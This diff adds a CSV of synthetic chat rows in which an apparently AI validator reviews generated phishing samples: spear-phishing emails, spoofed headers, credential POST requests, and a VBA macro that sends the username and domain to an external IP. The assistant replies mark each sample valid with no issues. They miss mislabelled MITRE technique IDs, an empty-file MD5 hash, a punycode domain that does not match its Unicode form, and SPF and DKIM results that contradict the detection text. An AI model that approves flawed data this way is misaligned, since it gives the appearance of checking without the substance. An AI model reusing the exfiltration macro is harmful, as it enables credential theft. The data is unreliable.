@@ -1,0 +1,1513 @@
+system,user,assistant
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: credential_harvesting
+- Description: Attackers send emails impersonating trusted entities to trick users into submitting their login credentials on fake websites.
+- Risk Reduction: Implement multi-factor authentication (MFA) to reduce impact of stolen credentials, Deploy advanced email filtering and anti-phishing tools, Conduct regular user training and simulated phishing exercises
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Credential harvesting via spear-phishing email impersonating corporate IT department"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <it-support-secure@microsoftech-support.com>\r\nReceived: from mail.microsoftech-support.com (mail.microsoftech-support.com [198.51.100.25])\r\n\tby mx.corporate.com (Postfix) with ESMTPS id 3F2B6401C3\r\n\tfor <victim@corporate.com>; Tue, 04 Apr 2023 15:24:52 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.2\r\nX-Spam-Level: *\r\nX-Microsoft-Antispam: BCL:0; PCL:0;\r\nX-Mailer: Microsoft Outlook 16.0\r\nFrom: \""IT Support - Corporate\"" <it-support-secure@microsoftech-support.com>\r\nTo: victim@corporate.com\r\nSubject: Urgent: Password Expiry Notice - Immediate Action Required\r\nDate: Tue, 4 Apr 2023 15:24:47 +0000\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\""UTF-8\""\r\nX-Originating-IP: [198.51.100.25]\r\nAuthentication-Results: mx.corporate.com; dkim=fail (signature did not verify) header.d=microsoft.com; spf=fail smtp.mailfrom=microsoftech-support.com;\r\n"",
+    ""email_body_html"": ""<html><body><p>Dear User,</p><p>Your corporate account password will expire in 24 hours. To avoid service disruption, please <a href=\""https://secure-login.microsoftech-support.com/login?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\"">update your credentials immediately</a>.</p><p>Failure to comply will result in account suspension.</p><p>Regards,<br>IT Support Team</p></body></html>"",
+    ""smtp_transaction_log"": ""220 mail.microsoftech-support.com ESMTP Postfix\r\nEHLO attacker-pc.local\r\n250-mail.microsoftech-support.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<it-support-secure@microsoftech-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<victim@corporate.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 3F2B6401C3\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""phishing_url_details"": {
+      ""url"": ""https://secure-login.microsoftech-support.com/login?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"",
+      ""domain_registration"": {
+        ""registrar"": ""NameCheap, Inc."",
+        ""creation_date"": ""2023-03-29T08:12:00Z"",
+        ""expiration_date"": ""2024-03-29T08:12:00Z"",
+        ""registrant"": {
+          ""name"": ""Privacy Protection Service"",
+          ""organization"": ""Domains By Proxy, LLC"",
+          ""email"": ""contact@privacyguard.com""
+        }
+      },
+      ""url_obfuscation"": ""Use of subdomain 'secure-login' and domain name 'microsoftech-support.com' mimicking 'microsoft.com' with added 'tech' to evade simple domain blacklists.""
+    },
+    ""web_server_access_log"": ""198.51.100.25 - - [04/Apr/2023:15:25:03 +0000] \""GET /login?session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 HTTP/1.1\"" 200 2345 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\"""",
+    ""post_request_example"": ""POST /login HTTP/1.1\r\nHost: secure-login.microsoftech-support.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 52\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\nusername=victim@corporate.com&password=SuperSecret123!""
+  },
+  ""indicators"": [
+    ""Phishing domain: microsoftech-support.com"",
+    ""Suspicious subdomain: secure-login.microsoftech-support.com"",
+    ""Email DKIM fail, SPF fail with mismatched domain"",
+    ""Unusual SMTP originating IP: 198.51.100.25 (not corporate infrastructure)"",
+    ""URL contains JWT-like session token parameter"",
+    ""Access logs showing legitimate user agent but unusual referrer '-' for login page""
+  ],
+  ""detection_method"": ""Email gateway flagged DKIM and SPF failures, heuristic anti-phishing detection based on domain similarity and URL structure; web proxy alert on access to unknown domain with credential POST; endpoint detection on suspicious outbound HTTPS traffic to new domain; user-reported phishing simulation failure."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Link"",
+    ""T1078 - Valid Accounts"",
+    ""T1586.001 - Compromise Infrastructure: Phishing Infrastructure""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a credential harvesting social engineering attack via spear-phishing email. The scenario clearly describes impersonation of a trusted corporate IT department to trick the user. The technical data includes realistic email headers showing DKIM and SPF failures, a plausible phishing URL mimicking a legitimate domain with subtle obfuscation, SMTP transaction logs, web server access logs, and an example POST request capturing stolen credentials. Indicators are well articulated, explaining why the sample matches the problem, including domain spoofing, email authentication failures, and suspicious URL parameters. The detection methods align with real-world defenses against such attacks. Relevant MITRE techniques are correctly identified. Overall, the sample is complete, realistic, and correctly aligned with the problem nature. For improvement, the sample could explicitly mention risk reduction measures such as MFA implementation or user training in the comments or detection method section to reinforce mitigation strategies.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: credential_harvesting
+- Description: Attackers send emails impersonating trusted entities to trick users into submitting their login credentials on fake websites.
+- Risk Reduction: Implement multi-factor authentication (MFA) to reduce impact of stolen credentials, Deploy advanced email filtering and anti-phishing tools, Conduct regular user training and simulated phishing exercises
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Mass credential harvesting via bulk phishing campaign using homoglyph domain and URL encoding"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <security-alert@\u0430\u0440\u04401e-support.com>\r\nReceived: from mail.\u0430\u0440\u04401e-support.com (mail.\u0430\u0440\u04401e-support.com [203.0.113.45])\r\n\tby mx.company.com (Postfix) with ESMTPS id 7A9C5402B4\r\n\tfor <all@company.com>; Wed, 05 Apr 2023 08:12:14 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 2.5\r\nX-Spam-Level: **\r\nFrom: \""Apple Security\"" <security-alert@\u0430\u0440\u04401e-support.com>\r\nTo: all@company.com\r\nSubject: Important: Account Verification Required\r\nDate: Wed, 5 Apr 2023 08:12:10 +0000\r\nMIME-Version: 1.0\r\nContent-Type: text/plain; charset=\""UTF-8\""\r\nX-Originating-IP: [203.0.113.45]\r\nAuthentication-Results: mx.company.com; dkim=neutral header.d=apple.com; spf=fail smtp.mailfrom=\u0430\u0440\u04401e-support.com;\r\n"",
+    ""email_body_plain"": ""Dear User,\n\nWe detected unusual activity on your Apple account. Please verify your identity immediately by visiting the link below:\n\nhttps://\u0430\u0440\u04401e-support.com/verify?user=%75%73%65%72%40%63%6f%6d%70%61%6e%79%2e%63%6f%6d\n\nFailure to verify your account within 24 hours will result in account suspension.\n\nApple Support Team"",
+    ""smtp_transaction_log"": ""220 mail.\u0430\u0440\u04401e-support.com ESMTP Postfix\r\nEHLO attacker-host\r\n250-mail.\u0430\u0440\u04401e-support.com\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security-alert@\u0430\u0440\u04401e-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<all@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 7A9C5402B4\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""phishing_url_details"": {
+      ""url"": ""https://xn--pple-43d-support.com/verify?user=user%40company.com"",
+      ""punycode_domain"": ""xn--pple-43d-support.com"",
+      ""unicode_domain"": ""\u0430\u0440\u04401e-support.com"",
+      ""domain_registration"": {
+        ""registrar"": ""GoDaddy.com, LLC"",
+        ""creation_date"": ""2023-02-15T12:00:00Z"",
+        ""expiration_date"": ""2024-02-15T12:00:00Z"",
+        ""registrant"": {
+          ""name"": ""PrivacyGuard LLC"",
+          ""organization"": ""PrivacyGuard LLC"",
+          ""email"": ""privacy@privacyguard.net""
+        }
+      },
+      ""url_obfuscation"": ""Use of Cyrillic characters '\u0430' and '\u0440' in place of Latin 'a' and 'p' plus URL encoding of email parameter to evade filters.""
+    },
+    ""web_server_access_log"": ""203.0.113.45 - - [05/Apr/2023:08:12:22 +0000] \""GET /verify?user=user%40company.com HTTP/1.1\"" 200 3456 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\"""",
+    ""post_request_example"": ""POST /submit-verification HTTP/1.1\r\nHost: \u0430\u0440\u04401e-support.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 43\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\nemail=user@company.com&password=P@ssw0rd2023!""
+  },
+  ""indicators"": [
+    ""Homoglyph domain '\u0430\u0440\u04401e-support.com' (Cyrillic letters) registered recently"",
+    ""Email SPF fail and DKIM neutral for mismatched domain"",
+    ""URL contains URL-encoded email parameter"",
+    ""SMTP originating IP 203.0.113.45 not in known Apple or corporate ranges"",
+    ""Access logs show no referrer and user agent mimics popular browsers"",
+    ""POST submission to /submit-verification endpoint with credential parameters""
+  ],
+  ""detection_method"": ""DNS monitoring for punycode domains resembling corporate brands; Email security gateway detection of SPF fail and domain spoofing; Web proxy or firewall alerts on access to homoglyph domains; Endpoint monitoring for credential POST traffic to suspicious domains; User training with phishing simulations to identify such tactics."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Link"",
+    ""T1566 - Phishing"",
+    ""T1586.001 - Compromise Infrastructure: Phishing Infrastructure""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a social engineering credential harvesting attack via phishing. It correctly uses a homoglyph domain with Cyrillic characters to impersonate a trusted brand (Apple), includes URL encoding to obfuscate the phishing URL, and shows realistic email headers and SMTP transaction logs. The indicators clearly explain why this is a credential harvesting phishing attack, including SPF fail, DKIM neutral, suspicious domain registration, and POST requests capturing credentials. The detection methods align well with risk reduction strategies such as email filtering, DNS monitoring, endpoint detection, and user training. All required fields are present and populated with plausible, detailed data. Overall, this is a comprehensive and realistic example that matches the problem description and risk mitigation recommendations.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: credential_harvesting
+- Description: Attackers send emails impersonating trusted entities to trick users into submitting their login credentials on fake websites.
+- Risk Reduction: Implement multi-factor authentication (MFA) to reduce impact of stolen credentials, Deploy advanced email filtering and anti-phishing tools, Conduct regular user training and simulated phishing exercises
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Credential harvesting via phishing email with embedded HTML form posting directly to attacker-controlled site"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <security-alert@corp-secure-notify.com>\r\nReceived: from mail.corp-secure-notify.com (mail.corp-secure-notify.com [192.0.2.150])\r\n\tby mail.company.com (Postfix) with ESMTPS id 9D8F6A07B1\r\n\tfor <employee@company.com>; Thu, 06 Apr 2023 09:55:30 +0000 (UTC)\r\nX-Spam-Flag: NO\r\nX-Spam-Score: 1.7\r\nX-Spam-Level: *\r\nFrom: \""Security Notification\"" <security-alert@corp-secure-notify.com>\r\nTo: employee@company.com\r\nSubject: Immediate Account Verification Required\r\nDate: Thu, 6 Apr 2023 09:55:25 +0000\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\""UTF-8\""\r\nX-Originating-IP: [192.0.2.150]\r\nAuthentication-Results: mail.company.com; dkim=fail header.d=company.com; spf=fail smtp.mailfrom=corp-secure-notify.com;"",
+    ""email_body_html"": ""<html><body><p>Dear Employee,</p><p>To continue uninterrupted access to your company resources, please verify your account immediately by completing the form below:</p><form action=\""https://login.corp-secure-notify.com/verify\"" method=\""POST\"">\r\n<label for=\""user\"">Username:</label><br>\r\n<input type=\""text\"" id=\""user\"" name=\""user\"" value=\""employee@company.com\""><br>\r\n<label for=\""pass\"">Password:</label><br>\r\n<input type=\""password\"" id=\""pass\"" name=\""pass\""><br>\r\n<input type=\""submit\"" value=\""Verify Account\"">\r\n</form><p>Thank you,<br>Corporate Security Team</p></body></html>"",
+    ""smtp_transaction_log"": ""220 mail.corp-secure-notify.com ESMTP Postfix\r\nEHLO attacker-laptop\r\n250-mail.corp-secure-notify.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security-alert@corp-secure-notify.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<employee@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[Email content]\r\n.\r\n250 2.0.0 Ok: queued as 9D8F6A07B1\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""phishing_url_details"": {
+      ""url"": ""https://login.corp-secure-notify.com/verify"",
+      ""domain_registration"": {
+        ""registrar"": ""Google Domains"",
+        ""creation_date"": ""2023-03-20T14:45:00Z"",
+        ""expiration_date"": ""2024-03-20T14:45:00Z"",
+        ""registrant"": {
+          ""name"": ""Privacy Protection Service"",
+          ""organization"": ""Domains By Proxy, LLC"",
+          ""email"": ""proxy@domainsbyproxy.com""
+        }
+      },
+      ""url_obfuscation"": ""Domain uses concatenation of legitimate-sounding words 'corp-secure-notify' to appear trustworthy; HTTPS enabled with Let's Encrypt SSL cert valid from 2023-04-01 to 2023-07-01""
+    },
+    ""web_server_access_log"": ""192.0.2.150 - - [06/Apr/2023:09:55:40 +0000] \""POST /verify HTTP/1.1\"" 200 1234 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.49 Safari/537.36\"""",
+    ""post_request_example"": ""POST /verify HTTP/1.1\r\nHost: login.corp-secure-notify.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 48\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\r\nuser=employee@company.com&pass=Passw0rd!2023""
+  },
+  ""indicators"": [
+    ""Domain corp-secure-notify.com registered recently with privacy proxy"",
+    ""Email SPF and DKIM fail for sending domain"",
+    ""Embedded HTML form in email posting credentials directly to attacker domain"",
+    ""POST requests from victim IP with credential parameters logged on phishing server"",
+    ""User agent strings consistent with victim's browser"",
+    ""No legitimate referrer headers in logs""
+  ],
+  ""detection_method"": ""Email security appliances detecting SPF/DKIM failures and embedded forms in emails; Web proxy logs alerting on POST requests to new domains; Network IDS flagging credential submission patterns; User awareness training highlighting embedded form risks."",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Link"",
+    ""T1566 - Phishing"",
+    ""T1078 - Valid Accounts""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a credential harvesting social engineering attack via phishing email. The scenario description aligns well with the problem nature, describing an email with an embedded HTML form that posts credentials directly to an attacker-controlled site. The technical data is detailed and realistic, including email headers showing SPF and DKIM failures, a plausible phishing URL with recent domain registration and privacy protection, SMTP transaction logs, web server access logs, and example POST requests capturing credentials. The indicators clearly explain why this is a credential harvesting attack, highlighting domain registration details, email authentication failures, embedded form usage, and victim activity logs. Detection methods and relevant MITRE techniques are appropriately included. Overall, the sample is complete, realistic, and well-structured, effectively illustrating the described cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: spear_phishing
+- Description: Highly targeted phishing emails crafted using personal information to deceive specific individuals into revealing sensitive data or executing malicious actions.
+- Risk Reduction: Use threat intelligence to identify and block targeted phishing campaigns, Educate employees on recognizing social engineering tactics, Enforce strict verification procedures for sensitive requests
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Spear phishing email targeting CFO to initiate fraudulent wire transfer"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <finance-update@rnbsbank-secure.com>\r\nReceived: from mail.rnbsbank-secure.com (mail.rnbsbank-secure.com [198.51.100.24]) by mx.company.com with ESMTPS id x7h32kdj12 for <cfo@company.com>;\r\n    Tue, 23 May 2023 14:32:45 -0400 (EDT)\r\nReceived-SPF: pass (company.com: domain of finance-update@rnbsbank-secure.com designates 198.51.100.24 as permitted sender) receiver=mx.company.com; client-ip=198.51.100.24; envelope-from=finance-update@rnbsbank-secure.com; helo=mail.rnbsbank-secure.com;\r\nAuthentication-Results: mx.company.com; dkim=pass header.d=rnbsbank-secure.com; spf=pass smtp.mailfrom=finance-update@rnbsbank-secure.com; dmarc=pass header.from=rnbsbank-secure.com\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAJ8kFz1c6eYKGc=2h5Q4o2nW3xJ1pLxW3m=R4f9=9BzHmP3F_Q@mail.rnbsbank-secure.com>\r\nFrom: \""RNBS Bank Corporate Finance\"" <finance-update@rnbsbank-secure.com>\r\nTo: cfo@company.com\r\nSubject: Urgent: Wire Transfer Authorization Required\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\""UTF-8\""\r\nContent-Transfer-Encoding: quoted-printable"",
+    ""email_body"": ""<html><body><p>Dear John,</p><p>Following up on your recent inquiry, please authorize the attached wire transfer to the following beneficiary:</p><p><b>Beneficiary:</b> Global Tech Supplies Ltd.<br><b>Account Number:</b> 456789123<br><b>Amount:</b> $1,250,000 USD</p><p>Please confirm by replying with your approval or use the secure link below to verify and authorize the transfer immediately:</p><p><a href=\""https://rnbsbank-secure.com/verify?token=5f8d2b3c4e9a7d1f\"">https://rnbsbank-secure.com/verify?token=5f8d2b3c4e9a7d1f</a></p><p>Best regards,<br>RNBS Bank Corporate Finance Team</p></body></html>"",
+    ""smtp_transaction_log"": ""220 mail.rnbsbank-secure.com ESMTP Postfix\r\nEHLO attacker-host.com\r\n250-mail.rnbsbank-secure.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<finance-update@rnbsbank-secure.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA]\r\n.\r\n250 2.0.0 Ok: queued as 12345\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""domain_registration"": {
+      ""domain"": ""rnbsbank-secure.com"",
+      ""registrant"": ""Privacy Protect LLC"",
+      ""registrant_country"": ""US"",
+      ""creation_date"": ""2023-04-18T10:21:00Z"",
+      ""expiration_date"": ""2024-04-18T10:21:00Z"",
+      ""name_servers"": [
+        ""ns1.privacyns.com"",
+        ""ns2.privacyns.com""
+      ],
+      ""status"": ""clientTransferProhibited""
+    },
+    ""url_structure"": ""https://rnbsbank-secure.com/verify?token=5f8d2b3c4e9a7d1f (domain mimics legitimate bank domain with addition of '-secure' suffix, token is random 16 hex chars)"",
+    ""dns_resolution"": {
+      ""rnbsbank-secure.com"": ""198.51.100.24""
+    }
+  },
+  ""indicators"": [
+    ""Domain rnbsbank-secure.com registered recently (within last 2 months)"",
+    ""Email from finance-update@rnbsbank-secure.com spoofing legitimate bank"",
+    ""URL uses rnbsbank-secure.com instead of rnbsbank.com"",
+    ""Token parameter in URL suspicious, likely phishing landing page"",
+    ""SMTP server IP 198.51.100.24 does not match legitimate bank mail servers""
+  ],
+  ""detection_method"": ""Email gateway with SPF, DKIM, DMARC verification flagged domain similarity and domain age; URL reputation systems flagged rnbsbank-secure.com; user education detects unexpected wire transfer request; network IDS detects outbound DNS queries for rnbsbank-secure.com; sandbox detonation shows phishing landing page"",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1566.002 - Phishing: Spearphishing Link"",
+    ""T1598.001 - Phishing: Spearphishing via Service"",
+    ""T1606 - Forge Web Credentials""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a spear phishing scenario targeting a CFO with a fraudulent wire transfer request. It aligns well with the problem nature of highly targeted phishing emails crafted using personal information to deceive specific individuals. The scenario is realistic, involving domain spoofing with a recently registered domain mimicking a legitimate bank, use of a plausible email and URL structure, and detailed technical data including email headers, SMTP logs, domain registration info, and DNS resolution. Indicators clearly highlight suspicious elements such as recent domain registration, domain similarity, mismatched SMTP server IP, and suspicious URL tokens, effectively explaining why this is a spear phishing case. The detection methods and relevant MITRE techniques are appropriate and comprehensive. All required fields are present and accurately populated, providing a complete and detailed example suitable for illustrating the stated cybersecurity problem and risk reduction strategies.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: spear_phishing
+- Description: Highly targeted phishing emails crafted using personal information to deceive specific individuals into revealing sensitive data or executing malicious actions.
+- Risk Reduction: Use threat intelligence to identify and block targeted phishing campaigns, Educate employees on recognizing social engineering tactics, Enforce strict verification procedures for sensitive requests
+
+Validation criteria:
+1. Correctness: Does the sample align with the problem nature?
+2. Realism: Is the example plausible in a real-world scenario?
+3. Completeness: Are all required fields present and accurately populated?
+4. Indicators: Do the indicators clearly explain why the sample matches the problem?
+","Please validate the following sample and return a JSON object with keys:
+- 'valid': boolean, whether the sample is valid.
+- 'issues': list of strings describing any problems or missing elements.
+- 'comments': detailed feedback on improvements.
+
+Sample:
+{
+  ""scenario"": ""Spear phishing email to IT administrator with malicious macro-enabled Excel attachment designed to harvest credentials"",
+  ""technical_data"": {
+    ""email_headers"": ""Return-Path: <it-support@microsofficealerts.com>\r\nReceived: from mail.microsofficealerts.com (mail.microsofficealerts.com [203.0.113.77]) by mx.company.com with ESMTPS id b9k38jfd39 for <itadmin@company.com>;\r\n    Wed, 24 May 2023 09:14:27 -0400 (EDT)\r\nReceived-SPF: fail (company.com: domain of it-support@microsofficealerts.com does not designate 203.0.113.77 as permitted sender) receiver=mx.company.com; client-ip=203.0.113.77; envelope-from=it-support@microsofficealerts.com; helo=mail.microsofficealerts.com;\r\nAuthentication-Results: mx.company.com; dkim=none; spf=fail smtp.mailfrom=it-support@microsofficealerts.com; dmarc=fail header.from=microsofficealerts.com\r\nMessage-ID: <CAJ8kFz1a7c9x2kBv2Y7pq9wZ3v6wXbLm9q@mail.microsofficealerts.com>\r\nFrom: \""Microsoft Office Alerts\"" <it-support@microsofficealerts.com>\r\nTo: itadmin@company.com\r\nSubject: Urgent Security Update - Action Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\""----=_NextPart_000_001A_01D9722A.4C9D2C10\""\r\nX-Mailer: Microsoft Outlook 16.0"",
+    ""smtp_transaction_log"": ""220 mail.microsofficealerts.com ESMTP Postfix\r\nEHLO attacker-host.com\r\n250-mail.microsofficealerts.com\r\n250-PIPELINING\r\n250-SIZE 20971520\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250 8BITMIME\r\nMAIL FROM:<it-support@microsofficealerts.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<itadmin@company.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n[DATA]\r\n.\r\n250 2.0.0 Ok: queued as 67890\r\nQUIT\r\n221 2.0.0 Bye"",
+    ""attachment_details"": {
+      ""filename"": ""Security_Update_May2023.xlsm"",
+      ""file_size"": 512000,
+      ""md5"": ""d41d8cd98f00b204e9800998ecf8427e"",
+      ""sha256"": ""3a7bd3e2360a3e0d6e14edcbb9e3b4e2d7a4b6e3a7b9f4e1f9a2c9c8e4d7f0a2"",
+      ""macro_code_snippet"": ""Sub AutoOpen()\r\n   Dim strURL As String\r\n   strURL = \""http://198.51.100.45/malware/collector.php\""\r\n   Dim strData As String\r\n   strData = Environ(\""USERNAME\"") & \"":\"" & Environ(\""USERDOMAIN\"")\r\n   Dim objHttp As Object\r\n   Set objHttp = CreateObject(\""MSXML2.XMLHTTP\"")\r\n   objHttp.Open \""POST\"", strURL, False\r\n   objHttp.Send strData\r\nEnd Sub"",
+      ""macro_behavior"": ""Upon opening, macro sends HTTP POST request with username and domain info to external IP 198.51.100.45""
+    },
+    ""url_access_log"": ""10.5.100.12 - - [24/May/2023:09:15:03 -0400] \""POST /malware/collector.php HTTP/1.1\"" 200 34 \""-\"" \""Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""\r\nPayload: itadmin:CORP"",
+    ""domain_registration"": {
+      ""domain"": ""microsofficealerts.com"",
+      ""registrant"": ""Fake Registrar Inc"",
+      ""registrant_country"": ""RU"",
+      ""creation_date"": ""2023-05-01T15:00:00Z"",
+      ""expiration_date"": ""2024-05-01T15:00:00Z"",
+      ""name_servers"": [
+        ""ns1.fakens.ru"",
+        ""ns2.fakens.ru""
+      ],
+      ""status"": ""clientDeleteProhibited""
+    }
+  },
+  ""indicators"": [
+    ""Sender domain microsofficealerts.com not legitimate Microsoft domain"",
+    ""SPF and DKIM fail for sending domain"",
+    ""Macro-enabled Excel attachment with AutoOpen macro"",
+    ""Macro sends Windows environment variables via HTTP POST to suspicious IP 198.51.100.45"",
+    ""Outbound HTTP POST to unknown external server immediately after opening"",
+    ""Domain microsofficealerts.com registered recently and hosted on suspicious name servers""
+  ],
+  ""detection_method"": ""Email anti-malware scans detect macro-enabled attachment; sandbox detonation reveals outbound HTTP POST with credentials; network IDS flags HTTP POST to known malicious IP; SPF/DKIM failures increase suspicion; user reports unexpected security update email"",
+  ""relevant_mitre_techniques"": [
+    ""T1566.001 - Phishing: Spearphishing Attachment"",
+    ""T1204.002 - User Execution: Malicious File"",
+    ""T1071.001 - Application Layer Protocol: Web Protocols"",
+    ""T1056.001 - Input Capture: Keylogging""
+  ]
+}
+
+Return only valid JSON.
+","{""valid"": true, ""issues"": [], ""comments"": ""The sample accurately represents a spear phishing scenario targeting a specific individual (IT administrator) with a highly tailored email containing a malicious macro-enabled Excel attachment. The scenario aligns well with the problem nature of spear phishing as it uses a deceptive sender domain mimicking a legitimate Microsoft-related domain, includes a plausible social engineering lure ('Urgent Security Update - Action Required'), and contains a malicious macro designed to harvest credentials. The technical data is detailed and realistic, including email headers showing SPF/DKIM failures, SMTP transaction logs, attachment metadata with macro code, URL access logs confirming data exfiltration, and domain registration details indicating a suspicious and recently created domain. The indicators clearly explain why this sample matches the spear phishing problem, highlighting domain spoofing, authentication failures, malicious macro behavior, and suspicious network activity. Detection methods are comprehensive and appropriate, covering email scanning, sandbox analysis, network IDS, and user reporting. Relevant MITRE ATT&CK techniques are correctly identified and relevant to the attack vector. Overall, the sample is complete, realistic, and well-documented, making it a valid and effective example for the stated cybersecurity problem.""}"
+"You are a cybersecurity data validation assistant. 
+Your task is to assess whether the given sample correctly represents the stated cybersecurity problem and to provide detailed feedback.
+
+Problem:
+- Area: Social Engineering
+- Nature: spear_phishing
+- Description: Highly targeted phishing emails crafted using personal information to deceive specific individuals into revealing sensitive data or executing malicious actions.
+- Risk Reduction: Use threat intelligence to identify and block targeted phishing campaigns, Educate employees on recognizing social engineering tactics, Enforce strict verification procedures for sensitive requests
+
